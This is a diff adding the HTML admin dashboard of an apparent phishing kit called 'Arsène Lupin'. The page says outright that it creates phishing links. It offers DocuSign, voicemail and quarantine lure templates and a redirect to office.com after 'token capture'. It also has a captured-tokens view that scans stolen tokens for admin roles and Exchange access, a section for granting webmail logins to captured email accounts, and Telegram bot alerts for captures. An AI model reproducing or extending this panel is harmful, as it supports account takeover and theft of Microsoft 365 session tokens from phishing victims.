@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Arsène Lupin • Dashboard</title>
+  <link rel="stylesheet" href="../css/admin.css">
+</head>
+<body>
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <div class="logo">
+        <!-- Arsène Lupin Gentleman Thief SVG Logo -->
+        <svg width="42" height="42" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="sGold" x1="0" y1="0" x2="120" y2="120">
+              <stop offset="0%" stop-color="#e8c87a"/>
+              <stop offset="50%" stop-color="#d4a853"/>
+              <stop offset="100%" stop-color="#c49a3c"/>
+            </linearGradient>
+            <linearGradient id="sDark" x1="0" y1="0" x2="0" y2="120">
+              <stop offset="0%" stop-color="#1a1825"/>
+              <stop offset="100%" stop-color="#0e0d15"/>
+            </linearGradient>
+          </defs>
+          <rect width="120" height="120" rx="28" fill="url(#sDark)" stroke="url(#sGold)" stroke-width="2"/>
+          <!-- Top Hat -->
+          <ellipse cx="60" cy="35" rx="24" ry="3.5" fill="url(#sGold)" opacity="0.85"/>
+          <rect x="44" y="16" width="32" height="19" rx="3" fill="url(#sGold)" opacity="0.8"/>
+          <rect x="44" y="29" width="32" height="3.5" rx="1" fill="#0e0d15" opacity="0.5"/>
+          <rect x="55" y="29.5" width="10" height="2.5" rx="0.5" fill="url(#sGold)" opacity="0.6"/>
+          <!-- Head -->
+          <ellipse cx="60" cy="57" rx="17" ry="19" fill="#0e0d15"/>
+          <!-- Mask -->
+          <path d="M40 51 C40 51 46 45 60 45 C74 45 80 51 80 51 C80 51 76 58 71 58 C67 58 64 55 60 55 C56 55 53 58 49 58 C44 58 40 51 40 51Z" fill="url(#sGold)" opacity="0.8"/>
+          <ellipse cx="51" cy="51.5" rx="5.5" ry="4" fill="#0e0d15"/>
+          <ellipse cx="69" cy="51.5" rx="5.5" ry="4" fill="#0e0d15"/>
+          <!-- Monocle -->
+          <circle cx="69" cy="51.5" r="8.5" fill="none" stroke="url(#sGold)" stroke-width="1.5" opacity="0.85"/>
+          <path d="M77.5 51.5 Q83 57 80 70 Q78 78 75 83" fill="none" stroke="url(#sGold)" stroke-width="0.7" opacity="0.4" stroke-dasharray="2,2"/>
+          <!-- Smirk -->
+          <path d="M53 66 Q57 70 60 69 Q63 70 67 66" fill="none" stroke="url(#sGold)" stroke-width="1.2" opacity="0.5" stroke-linecap="round"/>
+          <!-- Bow tie -->
+          <path d="M55 78 L60 75 L65 78 L60 81 Z" fill="url(#sGold)" opacity="0.45"/>
+          <!-- Corners -->
+          <path d="M16 16 Q16 26 26 26" fill="none" stroke="url(#sGold)" stroke-width="0.5" opacity="0.2"/>
+          <path d="M104 16 Q104 26 94 26" fill="none" stroke="url(#sGold)" stroke-width="0.5" opacity="0.2"/>
+          <path d="M16 104 Q16 94 26 94" fill="none" stroke="url(#sGold)" stroke-width="0.5" opacity="0.2"/>
+          <path d="M104 104 Q104 94 94 94" fill="none" stroke="url(#sGold)" stroke-width="0.5" opacity="0.2"/>
+        </svg>
+        <div class="logo-text">
+          <span class="logo-title">Arsène Lupin</span>
+          <span class="logo-subtitle">Gentleman's Quarters</span>
+        </div>
+      </div>
+    </div>
+    
+    <div class="sidebar-label">NAVIGATION</div>
+
+    <nav class="sidebar-nav">
+      <a href="#" class="nav-link active" data-section="dashboard">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path d="M3 4a1 1 0 011-1h12a1 1 0 011 1v2a1 1 0 01-1 1H4a1 1 0 01-1-1V4zM3 10a1 1 0 011-1h6a1 1 0 011 1v6a1 1 0 01-1 1H4a1 1 0 01-1-1v-6zM14 9a1 1 0 00-1 1v6a1 1 0 001 1h2a1 1 0 001-1v-6a1 1 0 00-1-1h-2z"/>
+        </svg>
+        <span>Dashboard</span>
+      </a>
+      
+      <a href="#" class="nav-link" data-section="links">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path d="M12.586 4.586a2 2 0 112.828 2.828l-3 3a2 2 0 01-2.828 0 1 1 0 00-1.414 1.414 4 4 0 005.656 0l3-3a4 4 0 00-5.656-5.656l-1.5 1.5a1 1 0 101.414 1.414l1.5-1.5zm-5 5a2 2 0 012.828 0 1 1 0 101.414-1.414 4 4 0 00-5.656 0l-3 3a4 4 0 105.656 5.656l1.5-1.5a1 1 0 10-1.414-1.414l-1.5 1.5a2 2 0 11-2.828-2.828l3-3z"/>
+        </svg>
+        <span>Generated Links</span>
+      </a>
+      
+      <a href="#" class="nav-link" data-section="tokens">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z"/>
+        </svg>
+        <span>Captured Tokens <span id="tokenCount" style="opacity: 0.5; font-size: 11px;"></span></span>
+      </a>
+      
+      <a href="#" class="nav-link" data-section="webmail">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"/>
+          <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"/>
+        </svg>
+        <span>Webmail Users</span>
+      </a>
+
+      <div class="sidebar-label" style="margin-top: 16px;">SYSTEM</div>
+      
+      <a href="#" class="nav-link" data-section="settings">
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M11.49 3.17c-.38-1.56-2.6-1.56-2.98 0a1.532 1.532 0 01-2.286.948c-1.372-.836-2.942.734-2.106 2.106.54.886.061 2.042-.947 2.287-1.561.379-1.561 2.6 0 2.978a1.532 1.532 0 01.947 2.287c-.836 1.372.734 2.942 2.106 2.106a1.532 1.532 0 012.287.947c.379 1.561 2.6 1.561 2.978 0a1.533 1.533 0 012.287-.947c1.372.836 2.942-.734 2.106-2.106a1.533 1.533 0 01.947-2.287c1.561-.379 1.561-2.6 0-2.978a1.532 1.532 0 01-.947-2.287c.836-1.372-.734-2.942-2.106-2.106a1.532 1.532 0 01-2.287-.947zM10 13a3 3 0 100-6 3 3 0 000 6z"/>
+        </svg>
+        <span>Settings</span>
+      </a>
+    </nav>
+    
+    <div class="sidebar-footer">
+      <div class="sidebar-user">
+        <div class="user-avatar">A</div>
+        <div class="user-info">
+          <span class="user-name">Admin</span>
+          <span class="user-role">Panel Owner</span>
+        </div>
+      </div>
+      <button class="logout-btn" onclick="logout()">
+        <svg width="18" height="18" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M3 3a1 1 0 011-1h12a1 1 0 011 1v12a1 1 0 01-1 1H4a1 1 0 01-1-1V3zm10.293 9.293a1 1 0 001.414 1.414l3-3a1 1 0 000-1.414l-3-3a1 1 0 10-1.414 1.414L14.586 9H7a1 1 0 100 2h7.586l-1.293 1.293z" clip-rule="evenodd"/>
+        </svg>
+        <span>Logout</span>
+      </button>
+    </div>
+  </aside>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <!-- Header -->
+    <header class="header">
+      <div class="header-left">
+        <!-- Small Lupin emblem in header -->
+        <svg class="header-emblem" width="28" height="28" viewBox="0 0 120 120" fill="none">
+          <defs>
+            <linearGradient id="hGold" x1="0" y1="0" x2="120" y2="120">
+              <stop offset="0%" stop-color="#e8c87a"/>
+              <stop offset="100%" stop-color="#c49a3c"/>
+            </linearGradient>
+          </defs>
+          <circle cx="60" cy="60" r="56" fill="none" stroke="url(#hGold)" stroke-width="2" opacity="0.4"/>
+          <ellipse cx="60" cy="35" rx="20" ry="3" fill="url(#hGold)" opacity="0.6"/>
+          <rect x="46" y="18" width="28" height="17" rx="2" fill="url(#hGold)" opacity="0.5"/>
+          <path d="M42 51 C42 51 48 46 60 46 C72 46 78 51 78 51 C78 51 75 57 70 57 C66 57 64 54 60 54 C56 54 54 57 50 57 C45 57 42 51 42 51Z" fill="url(#hGold)" opacity="0.5"/>
+          <circle cx="69" cy="51" r="7" fill="none" stroke="url(#hGold)" stroke-width="1" opacity="0.5"/>
+        </svg>
+        <h1 id="pageTitle">Dashboard</h1>
+      </div>
+      <div class="header-actions">
+        <div class="header-time" id="headerTime"></div>
+        <button class="btn-icon" title="Notifications">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path d="M10 2a6 6 0 00-6 6v3.586l-.707.707A1 1 0 004 14h12a1 1 0 00.707-1.707L16 11.586V8a6 6 0 00-6-6zM10 18a3 3 0 01-3-3h6a3 3 0 01-3 3z"/>
+          </svg>
+        </button>
+      </div>
+    </header>
+
+    <!-- Dashboard Section -->
+    <section id="dashboard-section" class="content-section active">
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-icon" style="background: rgba(16, 185, 129, 0.08); color: #10b981;">
+            <svg width="24" height="24" viewBox="0 0 20 20" fill="currentColor">
+              <path fill-rule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z"/>
+            </svg>
+          </div>
+          <div class="stat-content">
+            <div class="stat-label">Total Captures</div>
+            <div class="stat-value" id="totalCaptures">0</div>
+          </div>
+        </div>
+
+        <div class="stat-card">
+          <div class="stat-icon" style="background: rgba(139, 92, 246, 0.08); color: #a78bfa;">
+            <svg width="24" height="24" viewBox="0 0 20 20" fill="currentColor">
+              <path d="M2 11a1 1 0 011-1h2a1 1 0 011 1v5a1 1 0 01-1 1H3a1 1 0 01-1-1v-5zM8 7a1 1 0 011-1h2a1 1 0 011 1v9a1 1 0 01-1 1H9a1 1 0 01-1-1V7zM14 4a1 1 0 011-1h2a1 1 0 011 1v12a1 1 0 01-1 1h-2a1 1 0 01-1-1V4z"/>
+            </svg>
+          </div>
+          <div class="stat-content">
+            <div class="stat-label">Active Sessions</div>
+            <div class="stat-value" id="activeSessions">0</div>
+          </div>
+        </div>
+
+        <div class="stat-card">
+          <div class="stat-icon" style="background: rgba(212, 168, 83, 0.08); color: #d4a853;">
+            <svg width="24" height="24" viewBox="0 0 20 20" fill="currentColor">
+              <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"/>
+              <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"/>
+            </svg>
+          </div>
+          <div class="stat-content">
+            <div class="stat-label">Generated Links</div>
+            <div class="stat-value" id="totalLinks">0</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="dashboard-card">
+        <div class="card-header">
+          <h3>Recent Captures</h3>
+        </div>
+        <div id="recentCapturesList">
+          <div class="empty-state-small">No captures yet</div>
+        </div>
+      </div>
+
+      <div style="height: 24px;"></div>
+
+      <div class="dashboard-card">
+        <div class="card-header">
+          <h3>Active Sessions</h3>
+          <button class="icon-btn" onclick="loadActiveSessions()" title="Refresh">
+            <svg width="16" height="16" viewBox="0 0 20 20" fill="currentColor">
+              <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z"/>
+            </svg>
+          </button>
+        </div>
+        <div id="activeSessionsList">
+          <div class="empty-state-small">No active sessions</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Links Section -->
+    <section id="links-section" class="content-section">
+      <div class="create-link-section">
+        <h2>Create New Link</h2>
+        <p class="text-muted">Select a template and create a phishing link</p>
+        
+        <div class="form-group">
+          <label>Template Design</label>
+          <div class="template-grid-inline">
+            <div class="template-card-inline selected" data-template="docusign" onclick="selectTemplateInline('docusign')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small">
+                  <div class="preview-logo-tiny" style="background: #FFCF23;">■</div>
+                  <div class="preview-code-tiny">XXXX</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>DocuSign</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('docusign', event)">Preview</button>
+              </div>
+            </div>
+            
+            <div class="template-card-inline" data-template="voicemail" onclick="selectTemplateInline('voicemail')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small">
+                  <div class="preview-logo-tiny" style="background: #0078d4;">🎙️</div>
+                  <div class="preview-code-tiny">XXXX</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>Voicemail</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('voicemail', event)">Preview</button>
+              </div>
+            </div>
+            
+            <div class="template-card-inline" data-template="quarantine" onclick="selectTemplateInline('quarantine')">
+              <div class="template-preview-small">
+                <div class="preview-minimal-small">
+                  <div class="preview-logo-tiny" style="background: #d83b01;">⚠️</div>
+                  <div class="preview-code-tiny">XXXX</div>
+                </div>
+              </div>
+              <div class="template-info-inline">
+                <h4>Quarantine</h4>
+                <button type="button" class="btn-preview-small" onclick="previewTemplateInline('quarantine', event)">Preview</button>
+              </div>
+            </div>
+          </div>
+          <input type="hidden" id="linkTemplateInline" value="docusign">
+          <small>Choose a template design for your phishing link</small>
+        </div>
+
+        <div class="form-group">
+          <label>Redirect URL</label>
+          <input type="url" id="redirectUrlInline" placeholder="https://www.office.com" value="https://www.office.com">
+          <small>Where to redirect users after token capture</small>
+        </div>
+
+        <button class="btn-primary" onclick="createLinkInline()">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd" d="M10 3a1 1 0 011 1v5h5a1 1 0 110 2h-5v5a1 1 0 11-2 0v-5H4a1 1 0 110-2h5V4a1 1 0 011-1z"/>
+          </svg>
+          Create Link
+        </button>
+      </div>
+
+      <div class="generated-links-section">
+        <h2>Generated Links</h2>
+        <div class="links-list" id="linksGrid">
+          <div class="empty-state">
+            <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+              <circle cx="32" cy="32" r="32" fill="rgba(255,255,255,0.03)"/>
+              <path d="M32 20v24M20 32h24" stroke="#64748b" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+            <h3>No links created yet</h3>
+            <p>Create your first link above</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Tokens Section -->
+    <section id="tokens-section" class="content-section">
+      <div class="section-header">
+        <button class="btn-secondary" onclick="loadAllTokens()">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z"/>
+          </svg>
+          Refresh
+        </button>
+        <button class="btn-secondary" onclick="backfillCapabilities()" id="backfillBtn" title="Scan all existing tokens for admin roles and Exchange capabilities">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z"/>
+          </svg>
+          🔍 Scan Existing Tokens
+        </button>
+      </div>
+      <div id="tokensContainer">
+        <div class="empty-state">
+          <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+            <circle cx="32" cy="32" r="32" fill="rgba(255,255,255,0.03)"/>
+            <path d="M32 20L40 28L32 36M24 28h16" stroke="#64748b" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          <h3>No tokens captured yet</h3>
+          <p>Tokens will appear here when users authenticate</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Webmail Section - Credentials Management -->
+    <section id="webmail-section" class="content-section">
+      <div class="create-link-section">
+        <h2>Create Webmail User</h2>
+        <p class="text-muted">Create login credentials for external mailbox access</p>
+
+        <div class="form-group">
+          <label>Select Email Profile</label>
+          <select id="webmailProfile" required>
+            <option value="">-- Select Profile --</option>
+          </select>
+          <small>Choose which captured email account to link</small>
+        </div>
+
+        <div class="form-group">
+          <label>Username</label>
+          <input type="text" id="webmailUsername" placeholder="Enter username">
+          <small>Username for webmail login</small>
+        </div>
+
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" id="webmailPassword" placeholder="Enter password">
+          <small>Minimum 6 characters</small>
+        </div>
+
+        <button class="btn-primary" onclick="createWebmailUserInline()">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd" d="M10 3a1 1 0 011 1v5h5a1 1 0 110 2h-5v5a1 1 0 11-2 0v-5H4a1 1 0 110-2h5V4a1 1 0 011-1z"/>
+          </svg>
+          Create Webmail User
+        </button>
+      </div>
+
+      <div class="generated-links-section">
+        <h2>Webmail Users &amp; Credentials</h2>
+        <div id="webmailContainer"></div>
+      </div>
+    </section>
+
+    <!-- Settings Section -->
+    <section id="settings-section" class="content-section">
+      <div class="settings-card">
+        <h2>Telegram Configuration</h2>
+        <p class="text-muted">Configure Telegram bot for notifications</p>
+        
+        <div class="form-group">
+          <label>Telegram Bot Token</label>
+          <input type="text" id="telegramToken" placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11">
+          <small>Get from @BotFather on Telegram</small>
+        </div>
+        
+        <div class="form-group">
+          <label>Telegram Chat ID</label>
+          <input type="text" id="telegramChatId" placeholder="123456789">
+          <small>Get from @userinfobot on Telegram</small>
+        </div>
+        
+        <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+          <button class="btn-primary" onclick="saveTelegramSettings()">
+            <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+              <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"/>
+            </svg>
+            Save Telegram Settings
+          </button>
+          <button class="btn-secondary" onclick="testTelegram()">
+            <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+              <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"/>
+              <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"/>
+            </svg>
+            Test Telegram
+          </button>
+        </div>
+        
+        <hr style="margin: 36px 0; border: none; border-top: 1px solid rgba(212,168,83,0.06);">
+        
+        <h2>Security</h2>
+        <p class="text-muted">Change your admin panel password</p>
+        
+        <div class="form-group">
+          <label>Current Password</label>
+          <input type="password" id="currentPassword" placeholder="Enter current password">
+        </div>
+        
+        <div class="form-group">
+          <label>New Password</label>
+          <input type="password" id="newPassword" placeholder="Enter new password">
+          <small>Minimum 6 characters</small>
+        </div>
+        
+        <div class="form-group">
+          <label>Confirm New Password</label>
+          <input type="password" id="confirmPassword" placeholder="Confirm new password">
+        </div>
+        
+        <button class="btn-primary" onclick="saveSettings()">Save All Settings</button>
+      </div>
+    </section>
+  </main>
+
+  <script src="../js/admin-dashboard.js"></script>
+  <script>
+    // Live clock in header
+    function updateClock() {
+      const now = new Date();
+      const el = document.getElementById('headerTime');
+      if (el) {
+        el.textContent = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
+      }
+    }
+    updateClock();
+    setInterval(updateClock, 30000);
+  </script>
+</body>
+</html>
